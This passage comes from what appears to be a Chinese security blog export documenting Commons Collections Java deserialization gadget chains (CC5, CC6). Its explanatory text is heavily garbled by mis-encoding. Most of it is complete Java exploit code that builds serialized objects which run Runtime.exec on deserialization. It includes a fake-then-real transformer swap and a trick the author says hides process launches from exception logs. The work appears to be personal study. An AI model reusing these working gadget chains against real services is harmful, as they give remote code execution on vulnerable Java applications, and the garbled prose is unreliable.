Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer chain = new ChainedTransformer(chainPart); Map hash0 = new HashMap(); Map lazy0 = LazyMap.decorate(hash0,chain); TiedMapEntry haha0 = new TiedMapEntry(lazy0,\u0026#34;fupanc0\u0026#34;); Transformer[] realTransformer = new Transformer[]{new ConstantTransformer(BadAttributeValueExpException.class),new InstantiateTransformer(new Class[]{Object.class},new Object[]{haha0})}; Transformer outerMap = new ChainedTransformer(realTransformer); Map hash1 = new HashMap(); Map lazy1 = LazyMap.decorate(hash1,outerMap); TiedMapEntry haha1 = new TiedMapEntry(lazy1,\u0026#34;fupanc1\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(haha1,\u0026#34;xxxx\u0026#34;); //é”™è¯¯ç‚¹ hash1.remove(\u0026#34;fupanc1\u0026#34;); hash0.remove(\u0026#34;fupanc0\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ä»£ç æœ‰é—®é¢˜ï¼Œåœ¨è¿è¡Œåæ˜¯æˆåŠŸåœ¨putéƒ¨åˆ†å¼¹å‡ºè®¡ç®—æœºï¼Œè¿™è¯´æ˜ä»£ç é€»è¾‘åº”è¯¥æ²¡é—®é¢˜ï¼Œå¹¶ä¸”è·Ÿæºç å‘ç°å‰é¢ç¡®å®åœ¨æŒ‰é¢„æœŸèµ°ï¼Œåœ¨å¼¹å‡ºè®¡ç®—æœºååœ¨åé¢çš„InstantiateTransformer#transformeçš„catchçš„var6éƒ¨åˆ†åä¸€ç‚¹çªç„¶ç»“æŸäº†ï¼Œå¯¼è‡´ç¨‹åºç›´æ¥ç»“æŸï¼Œè®©åé¢çš„removeå’Œåºåˆ—åŒ–ç­‰æ“ä½œéƒ½æ— æ³•å®ç°ï¼Œæœ‰ç‚¹æ€ªï¼Œå…ˆé—ç•™è¿™ä¸ªé—®é¢˜ï¼Œç­‰åé¢å­¦æ·±äº†å†æ¥æƒ³ã€‚\né™¤äº†ä¸Šé¢æ— æ³•å…¨éƒ¨è¿è¡Œçš„é—®é¢˜ï¼Œè¿˜æœ‰çœ‹ä»£ç ï¼Œå…¶å®å¯ä»¥è¯´æ˜¯å¤šæ­¤ä¸€ä¸¾äº†ï¼Œå®šä¹‰äº†ä¸¤ä¸ªTiedMapEntryæ¥å®ç°ï¼Œå°±ç®€å•äº†è§£ä¸€ä¸‹å°±è¡Œäº†ã€‚\nç°åœ¨æ¥å°è¯•è§£å†³ä¸€ä¸‹ï¼Œæ—¢ç„¶é—®é¢˜æ˜¯åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°±å¼¹å‡ºè®¡ç®—æœºï¼Œå¹¶ä¸”è°ƒè¯•äº†ä¸€ä¸‹ï¼Œé—®é¢˜åº”è¯¥æ˜¯åœ¨åŠ¨æ€åŠ è½½å­—èŠ‚ç è¿™é‡Œï¼Œç»“åˆå…¨éƒ¨CCé“¾çš„çŸ¥è¯†ç‚¹ï¼Œé‚£ä¹ˆæ˜¯å¦æˆ‘ä»¬å¯ä»¥å…ˆå‡å†çœŸå‘¢ï¼Ÿ\nå°è¯•ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 package org.example; import javax.management.BadAttributeValueExpException; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javax.xml.transform.Templates; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.LazyMap; import java.lang.reflect.Field; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map hash0 = new HashMap(); Map lazy0 = LazyMap.decorate(hash0,chain); TiedMapEntry haha0 = new TiedMapEntry(lazy0,\u0026#34;fupanc0\u0026#34;); Transformer[] realTransformer = new Transformer[]{new ConstantTransformer(BadAttributeValueExpException.class),new InstantiateTransformer(new Class[]{Object.class},new Object[]{haha0})}; Transformer outerMap = new ChainedTransformer(realTransformer); Map hash1 = new HashMap(); Map lazy1 = LazyMap.decorate(hash1,outerMap); TiedMapEntry haha1 = new TiedMapEntry(lazy1,\u0026#34;fupanc1\u0026#34;); HashMap hashMap = new HashMap(); hashMap.put(haha1,\u0026#34;xxxx\u0026#34;); hash1.remove(\u0026#34;fupanc1\u0026#34;); hash0.remove(\u0026#34;fupanc0\u0026#34;); Field field1 = chain.getClass().getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸåœ¨ååºåˆ—åŒ–æ—¶å¼¹å‡ºè®¡ç®—æœº\næ­£å¼å­¦ä¹  ç»§ç»­çœ‹æºç ï¼Œæˆ‘ä»¬çœ‹BadAttributeValueExpExceptionçš„readObject()æ–¹æ³•ï¼Œè¿™é‡Œä¹Ÿåˆ©ç”¨äº†toString()æ–¹æ³•ï¼š\nçœ‹è¿™ä¸ªreadObject()æ–¹æ³•ï¼ŒvalObjæ˜¯ä»gfä¸­çš„valå‚æ•°è·å–çš„ï¼Œè€Œgfåˆæ˜¯ä»ååºåˆ—åŒ–æµä¸­è¯»å–çš„ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦æ§åˆ¶äº†BadAttributeValueExpExceptionç±»çš„valå‚æ•°ï¼Œå°±ç›¸å½“äºæ§åˆ¶äº†valObjï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œéœ€è¦å°†valè®¾ç½®ä¸ºTiedMapEntryç±»çš„å®ä¾‹ã€‚\nç»§ç»­çœ‹ä»£ç ï¼Œåªè¦æˆ‘ä»¬ä¼ å…¥çš„valçš„å€¼ä¸æ˜¯Stringç±»å‹ï¼Œå¹¶ä¸”ç¬¦åˆç¬¬ä¸‰ä¸ªæ¡ä»¶ä¸­çš„çš„ä»»æ„ä¸€ä¸ªï¼Œå°±å¯ä»¥æˆåŠŸè¿›å…¥ç¬¬ä¸‰ä¸ªæ¡ä»¶çš„è¯­å¥ï¼Œä»è€Œå¯ä»¥æ‰§è¡ŒTiedMapEntryç±»çš„toString()æ–¹æ³•ã€‚\nåœ¨javaä¸­ï¼ŒSysyem.getSecurityManager()çš„è¿”å›å€¼é»˜è®¤æ˜¯nullï¼Œçœ‹å¦‚ä¸‹æµ‹è¯•è¯­å¥ï¼š\næ‰€ä»¥ä¸€èˆ¬æ˜¯å¯ä»¥è¿›å…¥åˆ°è¿™ä¸ªè¯­å¥çš„ã€‚\né‚£ä¹ˆç°åœ¨å°±å·®æ„é€ äº†ï¼Œæ€è·¯å°±æ˜¯å°†ä¸€ä¸ªè®¾ç½®å¥½äº†çš„TiedMapEntryç±»ä¼ ç»™valå°±è¡Œï¼Œç»“åˆå‰é¢å­¦è¿‡çš„ä»£ç ï¼Œå¯ä»¥å…ˆéšä¾¿ä¼ ï¼Œå†åå°„ä¿®æ”¹å³å¯ï¼Œæ‰€ä»¥å¯ä»¥å¦‚ä¸‹æ„é€ ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 package org.example; import javax.management.BadAttributeValueExpException; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { Transformer[] chainPart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(chainPart); Map hash = new HashMap(); Map lazy = LazyMap.decorate(hash,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); Object o = new BadAttributeValueExpException(null); Field x = BadAttributeValueExpException.class.getDeclaredField(\u0026#34;val\u0026#34;); x.setAccessible(true); x.set(o,outerMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nåŒæ ·çš„å¦‚æœä½ æƒ³ä½¿ç”¨å…¶ä»–ç±»å‹ï¼Œæ¯”å¦‚ç»“åˆåŠ¨æ€åŠ è½½å­—èŠ‚ç ä¹‹ç±»çš„ï¼ŒåŸºæœ¬éƒ½æ˜¯åªç”¨æ”¹ä¸€ä¸‹chainParté‚£é‡Œçš„é“¾å°±è¡Œã€‚\né—®é¢˜ å­çˆ¶ç±»çš„åºåˆ—åŒ–é—®é¢˜ ","date":"2024-07-21T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/cc5/","title":"CC5"},{"content":"CC6 åœ¨CC1å·²ç»è¯´è¿‡äº†ï¼Œåœ¨JDK 8u71ä»¥åï¼Œå®˜æ–¹ä¿®æ”¹äº†AnnotationInvocationHandlerçš„readObject()æ–¹æ³•ï¼Œå¯¼è‡´CC1ä¸èƒ½å†åˆ©ç”¨ã€‚\næ‰€ä»¥ç°åœ¨éœ€è¦æ‰¾å¯»æ–°çš„åˆ©ç”¨é“¾ç”¨äºè§£å†³é«˜ç‰ˆæœ¬Javaçš„é—®é¢˜ï¼Œç°åœ¨å…ˆæ¥çœ‹è¿™ä¸ªåˆ©ç”¨é“¾ã€‚\næµ‹è¯•ç¯å¢ƒ\nJDK 8u411 commons-collections 3.2.1 ä»£ç è°ƒè¯• åœ¨å‰é¢çš„CC1çš„LazyMapé“¾ä¸­åˆ©ç”¨çš„å°±æ˜¯get()æ–¹æ³•ï¼Œé‚£ä¹ˆç°åœ¨å…¶å®è¿˜å¯ä»¥å¯»æ‰¾åœ¨ä¸Šä¸‹æ–‡ä¸­æ˜¯å¦è¿˜æœ‰å…¶ä»–è°ƒç”¨LazyMap#get()çš„ç±»ï¼Œå¹¶ä¸”è¦æ±‚è¿™ä¸ªå¯åˆ©ç”¨çš„ç±»å®ç°äº†Serializableæ¥å£ã€‚ åœ¨è¿™é‡Œæ‰¾åˆ°çš„ç±»æ˜¯org.apache.commons.collections.keyvalue.TiedMapEntryï¼Œé‡ç‚¹å°±æ˜¯ä¸‹é¢çš„ä¸¤ä¸ªæ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯ï¼š\n1 2 3 4 5 6 7 8 9 //getValue() public Object getValue() { return this.map.get(this.key); } //hashCode() public int hashCode() { Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); } åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°åœ¨hashCode()æ–¹æ³•ä¸­è°ƒç”¨äº†getValue()æ–¹æ³•ï¼Œåœ¨getValue()æ–¹æ³•ä¸­çš„this.map.get(this.key);ï¼Œåªè¦è¿™é‡Œå¯ä»¥å°†this.mapçš„å€¼è®¾ç½®ä¸ºLazyMapçš„å®ä¾‹ï¼Œå°±åˆå¯ä»¥æˆä¸ºä¸€ä¸ªåˆ©ç”¨é“¾çš„èµ·å§‹ç‚¹ã€‚\næ‰€ä»¥ç°åœ¨éœ€è¦å…ˆæ‰¾åˆ°å¯ä»¥ä½¿ç”¨ä»€ä¹ˆç±»æ¥è§¦å‘TiedMapEntry#hashCode()æ–¹æ³•ï¼Œåœ¨è¿™é‡Œï¼ŒåŒæ ·çš„æœ‰ä¸¤æ¡é“¾å­ï¼Œåˆ†åˆ«æ˜¯HashMapå’ŒHashSet\nåˆ©ç”¨HashMap åˆ©ç”¨é“¾ä»£ç å®¡è®¡ æ­¤æ—¶æˆ‘æƒ³åˆ°äº†URLDNSé“¾ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªæ­¥éª¤è°ƒç”¨äº†hashCode()æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š è¿™é‡Œå°±æ˜¯è°ƒç”¨çš„keyçš„hashCodeæ–¹æ³•ï¼Œåœ¨URLDNSä¸­çš„è¿™ä¸ªkeyå¯¹åº”çš„æ˜¯URLç±»å®ä¾‹ï¼Œæ‰€ä»¥URLDNSä¸­è°ƒç”¨çš„æ˜¯URLç±»çš„hashCode()æ–¹æ³•ï¼Œé‚£ä¹ˆç°åœ¨å…¶å®ä¹Ÿæ¯”è¾ƒç®€å•äº†ï¼Œå…ˆå¤§æ¦‚æƒ³ä¸€ä¸‹æµç¨‹ï¼š\nè¿™é‡Œè‚¯å®šæ˜¯ç”¨HashMapä½œä¸ºåºåˆ—åŒ–ä»¥åŠååºåˆ—åŒ–çš„å¯¹è±¡ å¾ˆç®€å•äº†ï¼Œç„¶ååœ¨ååºçš„æ—¶å€™è‡ªç„¶ä¼šåˆ°hash()æ–¹æ³•ï¼Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦åœ¨è¦åºåˆ—åŒ–çš„ä»£ç ä¸­putè¿›ä¸€ä¸ªkeyä¸ºTiedMapEntryç±»çš„å®ä¾‹ï¼Œè®©è¿™ä¸ªkeyç­‰äºTiedMapEntryå¯¹è±¡ï¼Œè¿™æ ·å°±ä¼šé¡ºåˆ©è°ƒç”¨åˆ°TiedMapEntryç±»çš„hashCode()æ–¹æ³•ï¼Œç„¶åå†å°†TiedMapEntryç±»é‡Œé¢çš„mapè®¾ç½®ä¸ºLazyMapç±»çš„å®ä¾‹ï¼Œè¿™æ ·å°±ä¼šæˆåŠŸè°ƒç”¨åˆ°LazyMapç±»çš„getæ–¹æ³•ï¼Œåé¢å°±æ˜¯CC1ä¸­æè¿‡çš„äº†ã€‚ æµç¨‹åŸºæœ¬æ¸…æ¥šï¼Œç°åœ¨å°±æ˜¯å¦‚ä½•è®¾è®¡ä»£ç äº†\nç„¶åå°±æ˜¯çœ‹å¦‚ä½•ä¼ å…¥åŸºæœ¬ç›˜äº†ï¼ŒåŸºæœ¬ç›˜å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 //åŸºæœ¬ç›˜ package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.lang.annotation.Retention; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Retention.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); } } ç°åœ¨å°±æ˜¯éœ€è¦å°†è¿™ä¸ªåŸºæœ¬ç›˜ä¼ å…¥TiedMapEntryç±»ï¼Œçœ‹ä¸€ä¸‹è¿™ä¸ªç±»çš„æ„é€ æ–¹æ³•ï¼š\néƒ½æ˜¯publicï¼Œé‚£ä¹ˆç›´æ¥å¼•å…¥å³å¯ï¼Œæ‰€ä»¥è¿™é‡Œçš„åˆ©ç”¨ä»£ç å°±æ˜¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.lang.annotation.Retention; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map lazy = LazyMap.decorate(null,chain); TiedMapEntry o = new TiedMapEntry(lazy,null); HashMap hashMap = new HashMap(); hashMap.put(o,\u0026#34;xxx\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } æŠ¥é”™æ˜¾ç¤ºåœ¨å®ä¾‹åŒ–LazyMapé‚£é‡Œä¸èƒ½ä¼ å…¥nullï¼Œ\né‚£ä¹ˆæˆ‘å°±å†åˆ›ä¸€ä¸ªHashMapå®ä¾‹è¿›å»èµ‹å€¼ï¼Œé‚£ä¹ˆæµ‹è¯•ä»£ç å°±æ˜¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.lang.annotation.Retention; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry o = new TiedMapEntry(lazy,null); HashMap hashMap = new HashMap(); hashMap.put(o,\u0026#34;xxx\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } è¿è¡Œç»“æœå¦‚ä¸‹ï¼š\nè™½ç„¶æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼Œæœ¬æ¥ä¹Ÿä»¥ä¸ºåªæ˜¯å¹³å¸¸çš„æŠ¥é”™ï¼Œç„¶åå»çœ‹äº†ä¸€ä¸‹å…¶ä»–æ–‡ç« ï¼Œå‘ç°æ˜¯è‡ªå·±çš„ä»£ç æœ‰é—®é¢˜ï¼Œé¦–å…ˆå°±æ˜¯åœ¨hashMap.put()ï¼Œæœ¬èº«çš„put()æ–¹æ³•å°±æ˜¯ä¸HashMap#readObject()çš„éƒ¨åˆ†æºç ç›¸åŒï¼š\nè¿™æ ·åœ¨putæ—¶å°±ä¼šè§¦å‘ä¸€æ¬¡åˆ©ç”¨é“¾ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¼šå¼¹å‡ºè®¡ç®—æœºçš„åŸå› ï¼ˆåé¢ä¼šè¯´è¿™ä¸ªçš„è§£å†³æ–¹æ³•ï¼‰ã€‚\nå†æ¥çœ‹è¿™ä¸ªæŠ¥é”™å†…å®¹ï¼š\nè¿™ä¸ªæŠ¥é”™å†…å®¹æ˜¾ç¤ºæˆ‘åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­è¯•å›¾åºåˆ—åŒ–ä¸€ä¸ªä¸å¯åºåˆ—åŒ–çš„execæ‰§è¡Œåè¿”å›çš„Processå¯¹è±¡ï¼Œç„¶åå‰é¢çš„CC1å´æ²¡æœ‰æŠ¥è¿™æ ·çš„é”™ï¼Œè¿™é‡Œå°±çœ‹çœ‹å·®åˆ«(ä¸ªäººç†è§£ï¼Œä»…ä¾›å‚è€ƒ)ï¼š\nå¯¹äºå‰é¢çš„é”™è¯¯ä»£ç ï¼šé¦–å…ˆå°±æ˜¯æˆ‘ä»¬newäº†ä¸€ä¸ªHashMapå®ä¾‹ï¼Œç„¶åæˆ‘ä»¬å¾€é‡Œé¢putè¿›äº†ä¸€ä¸ªTiedMapEntryç±»å®ä¾‹ï¼Œè€Œåœ¨åºåˆ—åŒ–HashMapæ—¶ï¼Œä¼šéå† HashMap ä¸­çš„æ¯ä¸ª Map.Entry å¯¹è±¡ï¼ˆå³é”®å€¼å¯¹ï¼‰ï¼Œå¹¶åºåˆ—åŒ–æ¯ä¸ªé”®å€¼å¯¹ï¼Œè€Œå¯¹äºæ¯ä¸ª Map.Entryï¼ŒObjectOutputStream ä¼šè°ƒç”¨å®ƒä»¬çš„ getKey() å’Œ getValue() æ–¹æ³•æ¥è·å–é”®å’Œå€¼ï¼Œä»¥ä¾¿å¯¹å®ƒä»¬è¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶åObjectOutputStreamçš„writeObjectæ–¹æ³•å°±ä¼šå°è¯•å»åºåˆ—åŒ–ã€‚\nç„¶åç”±äºæˆ‘ä»¬è®¾ç½®çš„å€¼ï¼Œä¼ å…¥äº†TiedMapEntryç±»å®ä¾‹ï¼Œåœ¨è°ƒç”¨getValue()åä¼šè¿›å…¥LazyMapçš„get()æ–¹æ³•ä»è€Œå¯¼è‡´æ•´æ¡åˆ©ç”¨é“¾çš„è¿›è¡Œï¼Œç„¶åRuntime.getRuntime().exec(\u0026quot;calc\u0026quot;)ï¼Œè¿™ä¸ªè°ƒç”¨ä¼šå°è¯•å¯åŠ¨ä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œè¿”å›ä¸€ä¸ªä¸å¯åºåˆ—åŒ–çš„ Process å¯¹è±¡ã€‚ç”¨ä¸€ä¸ªä»£ç æµ‹è¯•ä¸€ä¸‹æ˜¯å¦ä¼šéå†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.lang.Runtime; import java.util.HashMap; import java.io.Serializable; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; import java.io.FileOutputStream; public class Main implements Serializable { public static void main(String args[]) throws Exception { HashMap o = new HashMap(); Runtime x = Runtime.getRuntime(); o.put(x,\u0026#34;xxx\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); } } è¿è¡Œç»“æœï¼š è¯´æ˜ç¡®å®åœ¨HashMapåºåˆ—åŒ–çš„æ—¶å€™ä¼šéå†æ¡ç›®å¹¶è°ƒç”¨writeObject()æ–¹æ³•å¯¹å…¶è¿›è¡Œåºåˆ—åŒ–ï¼Œå¦‚æœè¦åºåˆ—åŒ–çš„å¯¹è±¡æ²¡æœ‰å®šä¹‰writeObject()æ–¹æ³•ï¼Œå°±ä¼šè°ƒç”¨é»˜è®¤çš„writeObject()æ–¹æ³•å»åºåˆ—åŒ–å®ƒï¼ˆå¯¹äºé»˜è®¤ä¸ªäººç†è§£åº”è¯¥æ˜¯ObjectOutputStreamçš„writeObjectæ–¹æ³•ï¼‰ã€‚\nç»“åˆå‰é¢çš„è§£é‡Šï¼Œé‚£ä¹ˆå°±æ˜¯ç”±äºè°ƒç”¨äº†TiedMapEntryçš„getValue()æ–¹æ³•ï¼Œç„¶åè¿›è¡Œé“¾å¼ååº”ï¼Œæœ€ç»ˆä¼šè¿”å›ä¸€ä¸ªProcesså¯¹è±¡ä½œä¸ºè¿™ä¸ª\u0026quot;value\u0026quot;ï¼Œä½†æ˜¯ç”±äºè¿™ä¸ªå¯¹è±¡æ˜¯ä¸å¯è¢«åºåˆ—åŒ–çš„ï¼Œæ‰€ä»¥æœ€ç»ˆä¼šæŠ¥é”™ä¸å¯è¢«åºåˆ—åŒ–ã€‚\né‚£ä¹ˆå¯¹äºCC1ä¸­çš„LazyMapé“¾ï¼šé‚£é‡Œé€šè¿‡ä½¿ç”¨ AnnotationInvocationHandler ä»£ç†åŒ…è£… LazyMapï¼Œé¿å…åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­è§¦å‘å˜æ¢å™¨é“¾ï¼Œé¿å…äº†å¼‚å¸¸ã€‚ â€”â€”â€”â€”â€”â€”\né‚£ä¹ˆå¯¹äºè¿™ä¸ªé—®é¢˜çš„è§£å†³æ–¹æ³•ï¼Œysoserialæ—©åœ¨CC1ä¸­å°±æœ‰äº†ä¼˜åŒ–ï¼š å®ƒè¿™é‡Œæ˜¯æœ€åæ‰å°†æ¶æ„transformersæ•°ç»„è®¾ç½®åˆ°transformerChainä¸­ï¼Œè§£å†³é—®é¢˜çš„æ–¹æ³•å°±åœ¨è¿™é‡Œã€‚\nåŒæ—¶æ³¨æ„çœ‹åŸºæœ¬ç›˜ä»£ç é‡Œé¢ï¼Œæ·»åŠ äº†ä¸€ä¸ªConstantTransformer(1)ï¼Œè¿™æ˜¯ä¸ºäº†éšè—å¼‚å¸¸æ—¥å¿—ä¸­çš„ä¿¡æ¯ï¼Œèµ·åˆ°äº†éšè”½å¯åŠ¨è¿›ç¨‹çš„æ—¥å¿—ç‰¹å¾çš„ä½œç”¨ã€‚ä»¥CC1ä¸ºä¾‹çœ‹ä¸€ä¸‹ä½¿ç”¨è¿‡åçš„å·®åˆ«ï¼š ä½¿ç”¨å‰çš„ç‰¹å¾ï¼š\nä½¿ç”¨åçš„ç‰¹å¾ï¼š\nä½¿ç”¨ååŒæ 